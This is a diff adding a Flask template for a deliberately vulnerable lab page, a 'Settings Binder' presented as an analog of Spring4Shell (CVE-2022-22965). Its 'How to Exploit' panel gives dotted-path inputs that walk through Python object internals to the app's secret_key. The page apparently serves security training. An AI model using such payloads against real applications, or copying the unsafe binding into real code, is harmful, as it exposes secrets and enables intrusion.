@@ -1,0 +1,29 @@
+{% extends 'base.html' %}
+{% block title %}Settings Binder (CVE-2022-22965 Analog){% endblock %}
+{% block content %}
+<div class="pagehead">
+  <h1>Settings Binder</h1>
+  <p>Terminal display settings via dotted-path binding · <span class="badge warn">CVE-2022-22965 (Spring4Shell) analog</span></p>
+</div>
+<div class="panel">
+  <h2>Current <span>Settings</span></h2>
+  <p>theme = <b>{{ theme }}</b> · motion = <b>{{ motion }}</b></p>
+</div>
+<div class="panel">
+  <h2>How to <span>Exploit</span></h2>
+  <pre class="code"># Intended: path=theme value=dark
+# Attack: walk into Flask's app object
+path=_settings_binder_obj.__class__.__module__
+path=__class__.__init__.__globals__[app].secret_key</pre>
+</div>
+<div class="panel">
+  <form method="POST">
+    <div class="field-row">
+      <div><label>Property Path</label><input type="text" name="path" placeholder="theme"></div>
+      <div><label>Value</label><input type="text" name="value" placeholder="dark"></div>
+    </div>
+    <button class="btn" type="submit">Bind</button>
+  </form>
+  {% if result %}<pre class="code" style="margin-top:12px;">{{ result }}</pre>{% endif %}
+</div>
+{% endblock %}
